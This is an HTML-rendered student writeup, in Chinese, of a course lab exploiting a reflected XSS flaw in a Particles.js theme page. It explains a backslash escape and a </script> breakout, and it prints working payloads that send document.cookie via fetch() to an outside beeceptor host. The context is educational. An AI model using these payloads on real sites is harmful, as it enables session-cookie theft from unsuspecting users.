@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>2022 Computer Security HW10 Writeup - Web</title>
+        <style>
+/* From extension vscode.github */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+.vscode-dark img[src$=\#gh-light-mode-only],
+.vscode-light img[src$=\#gh-dark-mode-only] {
+	display: none;
+}
+
+/* From extension ms-toolsai.jupyter */
+/* These classnames are inherited from bootstrap, but are present in most notebook renderers */
+
+.alert {
+    width: auto;
+    padding: 1em;
+    margin-top: 1em;
+    margin-bottom: 1em;
+}
+.alert > *:last-child {
+    margin-bottom: 0;
+}
+#preview > .alert:last-child {
+    /* Prevent this being set to zero by the default notebook stylesheet */
+    padding-bottom: 1em;
+}
+
+.alert-success {
+    /* Note there is no suitable color available, so we just copy "info" */
+    background-color: var(--theme-info-background);
+    color: var(--theme-info-foreground);
+}
+.alert-info {
+    background-color: var(--theme-info-background);
+    color: var(--theme-info-foreground);
+}
+.alert-warning {
+    background-color: var(--theme-warning-background);
+    color: var(--theme-warning-foreground);
+}
+.alert-danger {
+    background-color: var(--theme-error-background);
+    color: var(--theme-error-foreground);
+}
+
+</style>
+        
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+<style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        <style>
+.task-list-item {
+    list-style-type: none;
+}
+
+.task-list-item-checkbox {
+    margin-left: -20px;
+    vertical-align: middle;
+    pointer-events: none;
+}
+</style>
+        
+    </head>
+    <body class="vscode-body vscode-light">
+        <h1 id="2022-computer-security-hw10-writeup---web">2022 Computer Security HW10 Writeup - Web</h1>
+<ul>
+<li><a href="https://github.com/fdff87554/Computer-Security-2022/tree/main/homework/Homework-10">HW10 github (Writeup and Payload)</a></li>
+</ul>
+<h2 id="particlesjs---lab">Particles.js - Lab</h2>
+<ul>
+<li>這題是一個 XSS 的 Example，雖然畫面中沒有輸入匡，但是可以從 url 發現我們選擇的 theme 會被帶入 url 中，而且可以看一下 source code，可以看到 config.value 會被直接帶入 script 中，所以我們可以利用這個特性來做 XSS。</li>
+<li>攻擊的 Source code 區段為下，<pre><code class="language-javascript=">&lt;script&gt;
+url.value = location; config.value = 'bubble'; fetch('/bubble.json').then(r =&gt; r.json()).then(json =&gt; {
+    particlesJS(&quot;particles-js&quot;, json)
+})
+&lt;/script&gt;
+</code></pre>
+</li>
+<li>那先來考慮如何建構 XSS，在輸入的過程中我們可以發現 server side 有過濾 <code>'</code>，因此如果要跳脫 <code>&lt;script&gt;</code> 內部的文字內容，我們可以利用 <code>\</code> 來做跳脫，會發生什麼事情是今天 Javascript 中的 <code>config.value = '\'; fetch('/\').thenj(r =&gt; ...</code> 這段的 <code>'; fetch(</code> 會因為前面的 <code>'</code> 被反斜跳脫而變成字串，直到 <code>fetch</code> 本身的單引號為止，都被視為 <code>config.value</code> 的字串。
+<blockquote>
+<p><img src="https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/week-02/web-lab01-xss-example-with-backslash-1.png" alt="web-lab01-xss-example-with-backslash"></p>
+</blockquote>
+</li>
+<li>那要記得我們的資料會被同步在 <code>config.value='&lt;input&gt;'</code> 跟 <code>fetch('/&lt;input&gt;.json')</code> 這個區域，那我們已經知道到 <code>/</code> 之前的資料都會被反斜線變成字元了，因此可以想像一下在反斜線之前添加怎樣的字串來建構惡意的 payload。舉例來說 payload=<code>1;\</code> 可以讓 config.value 語句完全中斷，然後後面的部分我們可以直接隨便在串接起來。我們先嘗試建立一個合法的 JS 讓語句能回彈 alert()，payload=<code>1;alert(1);console.log({x://\</code>，可以看到 alert() 成功被觸發。
+<blockquote>
+<p><img src="https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/week-02/web-lab01-xss-example-with-backslash-2.png" alt="web-lab01-xss-example-with-backslash">
+<img src="https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/week-02/web-lab01-xss-example-with-backslash-alert.png" alt="web-lab01-xss-example-with-backslash-alert"></p>
+</blockquote>
+</li>
+<li>那今天我們的目標是去偷 cookie，一般來說可以用 <code>doument.cookie</code> 來取得，那我們試著把 cookie 混在一段 request 中丟出來取得，payload=<code>1;fetch(&quot;https://crazyfirelee.free.beeceptor.com?&quot;+document.cookie);console.log({x://\</code>，可以看到我們的 cookie 成功被送出。<strong>這邊要特別注意的是，在 url 中的 <code>+</code> 要用 <code>%2b</code> 代替</strong>
+<blockquote>
+<p><img src="https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/week-02/web-lab01-xss-example-with-backslash-cookie.png" alt="web-lab01-xss-example-with-backslash-cookie"></p>
+</blockquote>
+</li>
+<li>那這邊除了用 <code>\</code> 反斜線來跳脫以外，講師還有提到另一個 JS 的特性就是不管在哪裡，只要看到 <code>&lt;script&gt;</code> 就會視為 JS Tag，因此假設我們今天不用反斜線而是用 <code>&lt;/script&gt;</code> 來閉合這段 JS，就可以直接從後面建構新的 JS 區段了。因此回到最一開始，如果我們利用 <code>&lt;/script&gt;</code> 作為跳脫，可以看到剛剛的 JS 區段被截斷而後半部直接被遺棄。
+<blockquote>
+<p><img src="https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/week-02/web-lab01-xss-example-with-script.png" alt="web-lab01-xss-example-with-script"></p>
+</blockquote>
+</li>
+<li>但這邊還沒有成功實作出怎麼利用 <code>&lt;/script&gt;</code> 建構 payload，等之後有成功會補上。
+<blockquote>
+<p>嘗試了一下 <code>&lt;/script&gt;&lt;script&gt;fetch(&quot;https://crazyfirelee.free.beeceptor.com?&quot;+document.cookie);&lt;/script&gt;</code> 會在 enter 之後直接送兩次 fetch 出來，但在 report 的時候不會觸發，還沒理解為什麼。</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h6 id="tags-cybersec-writeup-2022">tags: <code>CyberSec</code> <code>Writeup</code> <code>2022</code></h6>
+<style>
+.navbar-brand::after { content: " × Crazyfire Lee"; }
+</style>
+        
+        
+    </body>
+    </html>
